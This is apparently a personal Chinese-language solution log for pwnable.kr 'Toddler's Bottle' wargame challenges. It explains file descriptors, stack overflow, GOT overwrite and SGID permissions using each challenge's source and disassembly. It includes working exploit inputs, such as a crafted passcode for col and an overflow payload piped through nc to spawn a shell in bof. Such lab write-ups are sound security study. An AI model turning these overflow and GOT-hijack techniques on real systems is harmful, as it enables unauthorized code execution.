# pwnable解题记录

## [Toddler's Bottle]

> ​	理论上是比较简单的一层.

### fd

文件描述符---快速定位到文件的元数据.

标准输入就是从我们的键盘进行输入.

| 文件描述符 | 用途               | 宏定义          |
| :--------- | :----------------- | :-------------- |
| `0`        | 标准输入（stdin）  | `STDIN_FILENO`  |
| `1`        | 标准输出（stdout） | `STDOUT_FILENO` |
| `2`        | 标准错误（stderr） | `STDERR_FILENO` |

```C
int fd1 = open("file1.txt", O_RDONLY);  // 可能返回 3
int fd2 = open("file2.txt", O_WRONLY);  // 可能返回 4
```

当我们打开新文件的时候,会返回系统能分配给这个文件的最小整数作为文件描述符.

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}
```

这个很简单,输入的数字减去0x1234 = 0,那么就stdin,和LETMEWIN对比,相同就自动读取了flag.

### col

```man
DESCRIPTION
       col filters out reverse (and half-reverse) line feeds so the output is in the correct order, with only forward and half-forward
       line feeds. It also replaces any whitespace characters with tabs where possible. This can be useful in processing the output of
       nroff(1) and tbl(1).

       col reads from standard input and writes to standard output.

```

过滤反向换行符和特殊字符控制.

| 选项       | 作用                                           |
| :--------- | :--------------------------------------------- |
| `-b`       | 过滤掉所有控制字符（包括反向换行符和退格符）。 |
| `-x`       | 将制表符（Tab）转换为空格（默认保留制表符）。  |
| `-f`       | 保留正向换页符（默认过滤掉）。                 |
| `-l <NUM>` | 设置缓冲区行数（默认为 128 行）。              |

```C
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
                res += ip[i];
        }
        return res;
}

int main(int argc, char* argv[]){
        if(argc<2){
                printf("usage : %s [passcode]\n", argv[0]);
                return 0;
        }
        if(strlen(argv[1]) != 20){
                printf("passcode length should be 20 bytes\n");
                return 0;
        }

        if(hashcode == check_password( argv[1] )){
                setregid(getegid(), getegid());
                system("/bin/cat flag");
                return 0;
        }
        else
                printf("wrong passcode.\n");
        return 0;
}
```

读入20个字节,分为五个int类型:

```sh
col@ubuntu:~$ ./col "$(printf '\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\xE8\x05\xD9\x1D')"
```

\x表示对应的十六进制转义序列,把十六进制转换成对应的二进制数值.

比如\x00就是不可见字符\<NULL>

### bof

好像基本是堆栈溢出之类的.

```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                setregid(getegid(), getegid());
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}

```

检查程序的保护措施:

```sh
bof@ubuntu:~$ checksec ./bof
[!] Could not populate PLT: Cannot allocate 1GB memory to run Unicorn Engine
[*] '/home/bof/bof'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

32bit的小端序.

Relocation Read Only---防止GOT劫持攻击.

No execute---数据堆栈不可以执行---可能只能ROP攻击(不能在栈上面攻击)

ASLR:Position Independent Executable 地址随机化的一种.

发现有Canary的保护.

Stripped:符号表没有剥离,能看到函数名.

逆向:

```asm
000011fd <func>:
    11fd:       55                      push   %ebp
    11fe:       89 e5                   mov    %esp,%ebp
    1200:       56                      push   %esi
    1201:       53                      push   %ebx
    1202:       83 ec 30                sub    $0x30,%esp #分配了48个bytes给这个func
    1205:       e8 f6 fe ff ff          call   1100 <__x86.get_pc_thunk.bx>
    120a:       81 c3 f6 2d 00 00       add    $0x2df6,%ebx
    1210:       65 a1 14 00 00 00       mov    %gs:0x14,%eax #canary
    1216:       89 45 f4                mov    %eax,-0xc(%ebp)
    1219:       31 c0                   xor    %eax,%eax
    121b:       83 ec 0c                sub    $0xc,%esp
    121e:       8d 83 08 e0 ff ff       lea    -0x1ff8(%ebx),%eax
    1224:       50                      push   %eax
    1225:       e8 26 fe ff ff          call   1050 <printf@plt>
    122a:       83 c4 10                add    $0x10,%esp
    122d:       83 ec 0c                sub    $0xc,%esp
    1230:       8d 45 d4                lea    -0x2c(%ebp),%eax
    1233:       50                      push   %eax
    1234:       e8 27 fe ff ff          call   1060 <gets@plt>
    1239:       83 c4 10                add    $0x10,%esp
    123c:       81 7d 08 be ba fe ca    cmpl   $0xcafebabe,0x8(%ebp)
    1243:       75 2d                   jne    1272 <func+0x75>
    1245:       e8 36 fe ff ff          call   1080 <getegid@plt>
    124a:       89 c6                   mov    %eax,%esi
    124c:       e8 2f fe ff ff          call   1080 <getegid@plt>
    1251:       83 ec 08                sub    $0x8,%esp
    1254:       56                      push   %esi
    1255:       50                      push   %eax
    1256:       e8 55 fe ff ff          call   10b0 <setregid@plt>
    125b:       83 c4 10                add    $0x10,%esp
    125e:       83 ec 0c                sub    $0xc,%esp
    1261:       8d 83 17 e0 ff ff       lea    -0x1fe9(%ebx),%eax
    1267:       50                      push   %eax
    1268:       e8 33 fe ff ff          call   10a0 <system@plt>
    126d:       83 c4 10                add    $0x10,%esp
    1270:       eb 12                   jmp    1284 <func+0x87>
    1272:       83 ec 0c                sub    $0xc,%esp
    1275:       8d 83 1f e0 ff ff       lea    -0x1fe1(%ebx),%eax
    127b:       50                      push   %eax
    127c:       e8 0f fe ff ff          call   1090 <puts@plt>
    1281:       83 c4 10                add    $0x10,%esp
    1284:       90                      nop
    1285:       8b 45 f4                mov    -0xc(%ebp),%eax
    1288:       65 2b 05 14 00 00 00    sub    %gs:0x14,%eax
    128f:       74 05                   je     1296 <func+0x99>
    1291:       e8 4a 00 00 00          call   12e0 <__stack_chk_fail_local>
    1296:       8d 65 f8                lea    -0x8(%ebp),%esp
    1299:       5b                      pop    %ebx
    129a:       5e                      pop    %esi
    129b:       5d                      pop    %ebp
    129c:       c3                      ret    

0000129d <main>:
    129d:       8d 4c 24 04             lea    0x4(%esp),%ecx
    12a1:       83 e4 f0                and    $0xfffffff0,%esp
    12a4:       ff 71 fc                push   -0x4(%ecx)
    12a7:       55                      push   %ebp
    12a8:       89 e5                   mov    %esp,%ebp
    12aa:       51                      push   %ecx
    12ab:       83 ec 04                sub    $0x4,%esp
    12ae:       e8 22 00 00 00          call   12d5 <__x86.get_pc_thunk.ax>
    12b3:       05 4d 2d 00 00          add    $0x2d4d,%eax
    12b8:       83 ec 0c                sub    $0xc,%esp
    12bb:       68 ef be ad de          push   $0xdeadbeef
    12c0:       e8 38 ff ff ff          call   11fd <func>
    12c5:       83 c4 10                add    $0x10,%esp
    12c8:       b8 00 00 00 00          mov    $0x0,%eax
    12cd:       8b 4d fc                mov    -0x4(%ebp),%ecx
    12d0:       c9                      leave  
    12d1:       8d 61 fc                lea    -0x4(%ecx),%esp
    12d4:       c3                      ret    
```

可以在pwndgb中直接查看canary的值.

???怎么这么难......

就是简单的栈溢出,但是把问题想复杂了,不难,因为不用检查canary.

​	下面的情况是如果你想修改根据程序实时修改canary的值要进行的操作,就是在get之前直接修改内存的值.

```py
python
payload = b"A"*36 + b"\xbb\xbb\xbb\xbb" + b"\xcc"*16 + b"\xbe\xba\xfe\xca"
buf_addr = int(gdb.parse_and_eval("$ebp-0x30"))
for i, byte in enumerate(payload):
    gdb.execute(f"set {{unsigned char}} ({buf_addr}+{i}) = {byte}")
end
```

那么其实了解了栈的分布了之后:

```sh
bof@ubuntu:~$ ( python3 -c 'import sys; sys.stdout.buffer.write(b"A"*52 + b"\xbe\xba\xfe\xca" + b"\n")'; cat ) | nc 0 9000
```

看一下原理:

(...;...):括号内部是两条子shell,顺序执行py和cat两条命令.

这个子shell的输出利用nc(netcat)传给本地的(0)9000端口,执行sh.

python -c:是直接执行我们后面写的py代码部分.

sys.stdout.buffer.write()：直接写入二进制数据到标准输出（避免Python3对编码的自动转换）。



​	我们利用py来生成二进制数据,在CSAPP中是使用教授写好的工具转换,这一步很重要.



返回地址占4bytes + 临时栈分配48bytes

​	和起来就52bytes.在这之前就是我们分配的key,直接覆盖就可以了,破解获取了脚本之后传给nc终端,就能获取root控制权,获取flag.

### passcode

> 破解一个简单的C语言实现的登陆系统.比较有难度,20pts.

看看passcode.c:

```C
#include <stdio.h>
#include <stdlib.h>

// 登陆程序
// 注意scanf函数的用法,后面要传递的是指针,也就是& + 某个变量
// 但是我们传了两个未初始化的int类型
// 也就是会直接向这个地址写入一个值

// welcome中name输入的东西会留在stack上面
// 但是这时候passcode1没有定义,我们可以把passcode1设置成exitGOT表项中的调用地址
// scanf在写入的时候,往这个exit表项中写入system("/bin/cat flag")的地址
// 那么错误返回的时候就可以直接调用这里的命令.
void login(){
    	// 都是32bit整数
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
    	// 输入passcode1,是一个整数,并且输入完之后直接刷新缓冲区
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==123456 && passcode2==13371337){
                printf("Login OK!\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

// 欢迎程序,name有可能是漏洞.
// 但是这里 %100s 限制了字符串的长度
void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.1 beta.\n");
		
    	// 连续两次调用,会建立在相同的ebp上面 
        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}

```

逆向看看:

```asm
080491f6 <login>:
 80491f6:       55                      push   %ebp
 80491f7:       89 e5                   mov    %esp,%ebp
 80491f9:       56                      push   %esi
 80491fa:       53                      push   %ebx
 80491fb:       83 ec 10                sub    $0x10,%esp
 80491fe:       e8 2d ff ff ff          call   8049130 <__x86.get_pc_thunk.bx>
 8049203:       81 c3 fd 2d 00 00       add    $0x2dfd,%ebx
 8049209:       83 ec 0c                sub    $0xc,%esp
 804920c:       8d 83 08 e0 ff ff       lea    -0x1ff8(%ebx),%eax
 8049212:       50                      push   %eax
 8049213:       e8 38 fe ff ff          call   8049050 <printf@plt>
 8049218:       83 c4 10                add    $0x10,%esp
 804921b:       83 ec 08                sub    $0x8,%esp
 804921e:       ff 75 f0                push   -0x10(%ebp)
 8049221:       8d 83 1b e0 ff ff       lea    -0x1fe5(%ebx),%eax
 8049227:       50                      push   %eax
 8049228:       e8 a3 fe ff ff          call   80490d0 <__isoc99_scanf@plt>
 804922d:       83 c4 10                add    $0x10,%esp
 8049230:       8b 83 fc ff ff ff       mov    -0x4(%ebx),%eax
 8049236:       8b 00                   mov    (%eax),%eax
 8049238:       83 ec 0c                sub    $0xc,%esp
 804923b:       50                      push   %eax
 804923c:       e8 1f fe ff ff          call   8049060 <fflush@plt>
 8049241:       83 c4 10                add    $0x10,%esp
 8049244:       83 ec 0c                sub    $0xc,%esp
 8049247:       8d 83 1e e0 ff ff       lea    -0x1fe2(%ebx),%eax
 804924d:       50                      push   %eax
 804924e:       e8 fd fd ff ff          call   8049050 <printf@plt>
 8049253:       83 c4 10                add    $0x10,%esp
 8049256:       83 ec 08                sub    $0x8,%esp
 8049259:       ff 75 f4                push   -0xc(%ebp)
 804925c:       8d 83 1b e0 ff ff       lea    -0x1fe5(%ebx),%eax
 8049262:       50                      push   %eax
 8049263:       e8 68 fe ff ff          call   80490d0 <__isoc99_scanf@plt>
 8049268:       83 c4 10                add    $0x10,%esp
 804926b:       83 ec 0c                sub    $0xc,%esp
 804926e:       8d 83 31 e0 ff ff       lea    -0x1fcf(%ebx),%eax
 8049274:       50                      push   %eax
 8049275:       e8 16 fe ff ff          call   8049090 <puts@plt>
 804927a:       83 c4 10                add    $0x10,%esp
 804927d:       81 7d f0 40 e2 01 00    cmpl   $0x1e240,-0x10(%ebp)
 8049284:       75 48                   jne    80492ce <login+0xd8>
 8049286:       81 7d f4 c9 07 cc 00    cmpl   $0xcc07c9,-0xc(%ebp)
 804928d:       75 3f                   jne    80492ce <login+0xd8>
 804928f:       83 ec 0c                sub    $0xc,%esp
 8049292:       8d 83 3d e0 ff ff       lea    -0x1fc3(%ebx),%eax
 8049298:       50                      push   %eax
 8049299:       e8 f2 fd ff ff          call   8049090 <puts@plt>
 804929e:       83 c4 10                add    $0x10,%esp
 80492a1:       e8 da fd ff ff          call   8049080 <getegid@plt>
 80492a6:       89 c6                   mov    %eax,%esi
 80492a8:       e8 d3 fd ff ff          call   8049080 <getegid@plt>
 80492ad:       83 ec 08                sub    $0x8,%esp
 80492b0:       56                      push   %esi
 80492b1:       50                      push   %eax
 80492b2:       e8 09 fe ff ff          call   80490c0 <setregid@plt>
 80492b7:       83 c4 10                add    $0x10,%esp
 80492ba:       83 ec 0c                sub    $0xc,%esp
 80492bd:       8d 83 47 e0 ff ff       lea    -0x1fb9(%ebx),%eax
 80492c3:       50                      push   %eax
 80492c4:       e8 d7 fd ff ff          call   80490a0 <system@plt>
 80492c9:       83 c4 10                add    $0x10,%esp
 80492cc:       eb 1c                   jmp    80492ea <login+0xf4>
 80492ce:       83 ec 0c                sub    $0xc,%esp
 80492d1:       8d 83 55 e0 ff ff       lea    -0x1fab(%ebx),%eax
 80492d7:       50                      push   %eax
 80492d8:       e8 b3 fd ff ff          call   8049090 <puts@plt>
 80492dd:       83 c4 10                add    $0x10,%esp
 80492e0:       83 ec 0c                sub    $0xc,%esp
 80492e3:       6a 00                   push   $0x0
 80492e5:       e8 c6 fd ff ff          call   80490b0 <exit@plt>
 80492ea:       90                      nop
 80492eb:       8d 65 f8                lea    -0x8(%ebp),%esp
 80492ee:       5b                      pop    %ebx
 80492ef:       5e                      pop    %esi
 80492f0:       5d                      pop    %ebp
 80492f1:       c3                      ret    

080492f2 <welcome>:
 80492f2:       55                      push   %ebp
 80492f3:       89 e5                   mov    %esp,%ebp                     
 80492f5:       53                      push   %ebx
 80492f6:       83 ec 74                sub    $0x74,%esp
 80492f9:       e8 32 fe ff ff          call   8049130 <__x86.get_pc_thunk.bx>
 80492fe:       81 c3 02 2d 00 00       add    $0x2d02,%ebx
 8049304:       65 a1 14 00 00 00       mov    %gs:0x14,%eax
 804930a:       89 45 f4                mov    %eax,-0xc(%ebp)
 804930d:       31 c0                   xor    %eax,%eax
 804930f:       83 ec 0c                sub    $0xc,%esp
 8049312:       8d 83 63 e0 ff ff       lea    -0x1f9d(%ebx),%eax
 8049318:       50                      push   %eax
 8049319:       e8 32 fd ff ff          call   8049050 <printf@plt>
 804931e:       83 c4 10                add    $0x10,%esp
 8049321:       83 ec 08                sub    $0x8,%esp
 8049324:       8d 45 90                lea    -0x70(%ebp),%eax # 相当于name的缓冲区是在0x70的位置
 8049327:       50                      push   %eax
 8049328:       8d 83 75 e0 ff ff       lea    -0x1f8b(%ebx),%eax
 804932e:       50                      push   %eax
 804932f:       e8 9c fd ff ff          call   80490d0 <__isoc99_scanf@plt>
 8049334:       83 c4 10                add    $0x10,%esp
 8049337:       83 ec 08                sub    $0x8,%esp
 804933a:       8d 45 90                lea    -0x70(%ebp),%eax
 804933d:       50                      push   %eax
 804933e:       8d 83 7b e0 ff ff       lea    -0x1f85(%ebx),%eax
 8049344:       50                      push   %eax
 8049345:       e8 06 fd ff ff          call   8049050 <printf@plt>
 804934a:       83 c4 10                add    $0x10,%esp
 804934d:       90                      nop
 804934e:       8b 45 f4                mov    -0xc(%ebp),%eax
 8049351:       65 2b 05 14 00 00 00    sub    %gs:0x14,%eax
 8049358:       74 05                   je     804935f <welcome+0x6d>
 804935a:       e8 61 00 00 00          call   80493c0 <__stack_chk_fail_local>
 804935f:       8b 5d fc                mov    -0x4(%ebp),%ebx
 8049362:       c9                      leave  
 8049363:       c3                      ret    

08049364 <main>:
 8049364:       8d 4c 24 04             lea    0x4(%esp),%ecx
 8049368:       83 e4 f0                and    $0xfffffff0,%esp
 804936b:       ff 71 fc                push   -0x4(%ecx)
 804936e:       55                      push   %ebp
 804936f:       89 e5                   mov    %esp,%ebp
 8049371:       53                      push   %ebx
 8049372:       51                      push   %ecx
 8049373:       e8 b8 fd ff ff          call   8049130 <__x86.get_pc_thunk.bx>
 8049378:       81 c3 88 2c 00 00       add    $0x2c88,%ebx
 804937e:       83 ec 0c                sub    $0xc,%esp
 8049381:       8d 83 88 e0 ff ff       lea    -0x1f78(%ebx),%eax
 8049387:       50                      push   %eax
 8049388:       e8 03 fd ff ff          call   8049090 <puts@plt>
 804938d:       83 c4 10                add    $0x10,%esp
 8049390:       e8 5d ff ff ff          call   80492f2 <welcome>
 8049395:       e8 5c fe ff ff          call   80491f6 <login>
 804939a:       83 ec 0c                sub    $0xc,%esp
 804939d:       8d 83 b0 e0 ff ff       lea    -0x1f50(%ebx),%eax
 80493a3:       50                      push   %eax
 80493a4:       e8 e7 fc ff ff          call   8049090 <puts@plt>
 80493a9:       83 c4 10                add    $0x10,%esp
 80493ac:       b8 00 00 00 00          mov    $0x0,%eax
 80493b1:       8d 65 f8                lea    -0x8(%ebp),%esp
 80493b4:       59                      pop    %ecx
 80493b5:       5b                      pop    %ebx
 80493b6:       5d                      pop    %ebp
 80493b7:       8d 61 fc                lea    -0x4(%ecx),%esp
 80493ba:       c3                      ret    
 80493bb:       66 90                   xchg   %ax,%ax
 80493bd:       66 90                   xchg   %ax,%ax
 80493bf:       90                      nop
```

> 我们先尝试使用GOT攻击.	

​	1.明确一个概念:

​	GOT（全局偏移表，**Global Offset Table**）是 Linux 动态链接程序中的一个关键数据结构，用于在运行时解析和调用共享库（如 `libc`）中的函数。它的主要作用是 **实现延迟绑定（Lazy Binding）**，即在程序**第一次调用某个函数时才解析其真实地址**。

​	和动态链接有关系---可以存储**外部函数的真实地址和提供间接跳转**的机制.

​	2.结构:

GOT 通常位于 `.got.plt`段，每个外部函数在 GOT 中都有一个条目（**entry**）。例如：



`printf@got.plt`：存储 `printf`的真实地址。

`system@got.plt`：存储 `system`的真实地址。

​	在程序第一次调用某个函数时，动态链接器（`ld.so`）会解析该函数的真实地址并写入 GOT。后续调用时，程序直接跳转到 GOT 中的地址，无需再次解析。

​	3.什么是PLT,怎么工作?

GOT 通常和 PLT（Procedure Linkage Table，过程链接表）一起工作：

**PLT**：包含一小段代码，用于跳转到 GOT 中的地址。

**GOT**：存储函数的真实地址。

**调用流程**：



1.程序调用 `printf@plt`。



2.`printf@plt`跳转到 `printf@got.plt`。



3.如果 `printf@got.plt`还未解析，动态链接器会解析 `printf`的真实地址并写入 `printf@got.plt`。



4.后续调用直接跳转到 `printf`的真实地址。

​	4.所以我们采用GOT攻击:

GOT 是可写的（因为需要动态解析），因此攻击者可以 **篡改 GOT 条目**，使程序跳转到恶意代码。例如：

覆盖 `exit@got.plt`，让程序在调用 `exit()`时执行 `system("/bin/sh")`。

覆盖 `printf@got.plt`，让程序在调用 `printf`时执行任意代码。

> ​	GOT存储了动态库函数的真实地址,我们想修改这部分地址.

> [!NOTE]
>
> ​	不知道你在这里会不会有一个小问题:既然buf上的值会留存下来,**为什么不直接使用buf把这两个passcode的值都直接覆盖掉**?
>
> ​	name: $ebp - 0x70
>
> ​	passcode1: $ebp - 0x10
>
> ​	0x70 - 0x10 = 0x60 = 96--->passcode1 96 97 98 99--->buffer覆盖不到passcode2
>
> ​	所以不行.

你可以在/tmp文件下创建一些你想用的临时文件.

我们用objdump -R命令来获取GOT表项.

```sh
passcode@ubuntu:~$ objdump -R passcode

passcode:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
0804bff8 R_386_GLOB_DAT    __gmon_start__@Base
0804bffc R_386_GLOB_DAT    stdin@GLIBC_2.0
0804c00c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.34
0804c010 R_386_JUMP_SLOT   printf@GLIBC_2.0
0804c014 R_386_JUMP_SLOT   fflush@GLIBC_2.0
0804c018 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
0804c01c R_386_JUMP_SLOT   getegid@GLIBC_2.0
0804c020 R_386_JUMP_SLOT   puts@GLIBC_2.0
0804c024 R_386_JUMP_SLOT   system@GLIBC_2.0
0804c028 R_386_JUMP_SLOT   exit@GLIBC_2.0
0804c02c R_386_JUMP_SLOT   setregid@GLIBC_2.0
0804c030 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
```

对于fflush表项的值进行重写,重写cat flag的命令.

```asm
80492bd:       8d 83 47 e0 ff ff       lea    -0x1fb9(%ebx),%eax
80492c3:       50                      push   %eax
80492c4:       e8 d7 fd ff ff          call   80490a0 <system@plt>
```

> [!NOTE]
>
> 如果你这里在后面直接写了 80492bd ,你会发现permition denied错误,居然没有权限.
>

实际上我们要注意到在这之前:

```C
setregid(getegid(), getegid());
system("/bin/cat flag");
```

我们来进一步了解用户权限的问题:

1.进程的身份:

​	**RUID**(Real):指真实用户的身份,谁启动了这个进程.

​	**EUID**(Effective):用来实际做检查的ID,即使你的用户程序是普通的,但是也有EUID可能是root.

​	**组ID**:进程用户属于哪个用户组.





2.SUID/SGID 程序

在 CTF/系统里常见的权限提升方式：

- 如果一个二进制有 **SUID root** 标志，它在执行时 EUID = root（虽然 RUID 还是普通用户）。
- 如果一个二进制有 **SGID groupX** 标志，它在执行时 EGID = groupX。

```sh
-r-xr-sr-x 1 root passcode_pwn 15232 ./passcode
```

**owner** 是 root

**group** 是 passcode_pwn

有 `s` → **SGID 程序**

所以执行它时，有效组 ID (EGID) 会变成 `passcode_pwn`。

#### 关于linux的权限问题

1.文件权限的基本格式

Linux 文件权限一共 10 个字符，像这样：

```sh
-rwxr-xr-x
```

拆分：

- 第 1 位：文件类型
  - `-` 普通文件
  - `d` 目录
  - `l` 符号链接
- 后 9 位分成三组（每组三位）：
  1. **Owner（属主）权限**
  2. **Group（属组）权限**
  3. **Others（其他人）权限**

每组的三位分别是：

- `r` = read
- `w` = write
- `x` = execute

2.特殊权限位（suid / sgid / sticky bit）

如果某一位出现 `s` 或 `S`，表示启用了特殊权限。
 在你给出的例子：

```sh
-r-xr-sr-x
```

拆开就是：

- **`-`** → 普通文件
- **`r-x`** → owner（root）有读和执行权限
- **`r-s`** → group 有读和执行权限，而且 **`s` 出现在 x 的位置 → SGID**,这里就是CTF常用的,整个组都有执行的权限.
- **`r-x`** → other 用户有读和执行权限

所以这个文件设置了 **SGID (Set Group ID)**。



3.SGID 的效果

当一个可执行文件带有 SGID 位时：

- **运行它的人，不管属于哪个组，进程的有效组 ID (EGID) 都会被设置为文件的属组。**

在这个例子里：

```sh
-r-xr-sr-x 1 root passcode_pwn ./passcode
```

- 属主 (owner) = `root`
- 属组 (group) = `passcode_pwn`
- 带有 **SGID**

所以任何用户运行 `./passcode` 时，进程的 **EGID = passcode_pwn**。



4.这和 `id` 的关系

`id` 命令显示当前用户的 UID / GID / groups，例如：

```bash
$ id
uid=1001(passcode) gid=1001(passcode) groups=1001(passcode)
```

这表示：

- 真实用户 (RUID) = 1001 (`passcode`)
- 真实组 (RGID) = 1001 (`passcode`)
- 有效 ID 默认和真实 ID 相同

但是当你运行一个 **带 SGID 的程序**：

- 真实用户 (RUID) 还是你自己 (`passcode`)
- **有效组 (EGID) 会变成 `passcode_pwn`**
- 所以你就临时“借用”了 `passcode_pwn` 组的权限（只在这个进程内）。--->这就是重点.

那么讲到这里,答案就很简单了.

```py
from pwn import * 

buf = b"A" * ??     # offset to ???
buf += p32(?????????)  # passcode1 pointing to ???
buf += '?????????'		# the got entry of ???

print(buf) # 注意python3严格区分str和bytes,这个程序用py2处理.
```




### random

看看这个C程序:

```C
#include <stdio.h>

int main(){
        unsigned int random;
        random = rand();        // random value!
        unsigned int key=0;
    
        scanf("%d", &key);
    
        if( (key ^ random) == 0xcafebabe ){
                printf("Good!\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag");
                return 0;
        }
    
        printf("Wrong, maybe you should try 2^32 cases.\n");
        return 0;
}
```

拿到random之后做异或运算要等于某些值.

直接在gdb内部临时计算某些值的大小:

```py
print/x 0x1234 ^ 0x5678    # 异或（输出十六进制）
print/d 10 + 20            # 加法（十进制）
print/t 0b1010 << 2        # 左移（二进制输出）
```

这个就非常简单.

### input2

先来看看代码:

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
        printf("Welcome to pwnable.kr\n");
        printf("Let's see if you know how to give input to program\n");
        printf("Just give me correct inputs then you will get the flag :)\n");

        // argv
        if(argc != 100) return 0;
        if(strcmp(argv['A'],"\x00")) return 0;
        if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
        printf("Stage 1 clear!\n");

        // stdio
        char buf[4];
        read(0, buf, 4);
        if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
        read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
        printf("Stage 2 clear!\n");

        // env
        if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
        printf("Stage 3 clear!\n");

        // file
        FILE* fp = fopen("\x0a", "r");
        if(!fp) return 0;
        if( fread(buf, 4, 1, fp)!=1 ) return 0;
        if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
        fclose(fp);
        printf("Stage 4 clear!\n");

        // network
        int sd, cd;
        struct sockaddr_in saddr, caddr;
        sd = socket(AF_INET, SOCK_STREAM, 0);
        if(sd == -1){
                printf("socket error, tell admin\n");
                return 0;
        }
        saddr.sin_family = AF_INET;
        saddr.sin_addr.s_addr = INADDR_ANY;
        saddr.sin_port = htons( atoi(argv['C']) );
        if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
                printf("bind error, use another port\n");
                return 1;
        }
        listen(sd, 1);
        int c = sizeof(struct sockaddr_in);
        cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
        if(cd < 0){
                printf("accept error, tell admin\n");
                return 0;
        }
        if( recv(cd, buf, 4, 0) != 4 ) return 0;
        if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
        printf("Stage 5 clear!\n");

        // here's your flag
        setregid(getegid(), getegid());
        system("/bin/cat flag");
        return 0;
}
```

































































































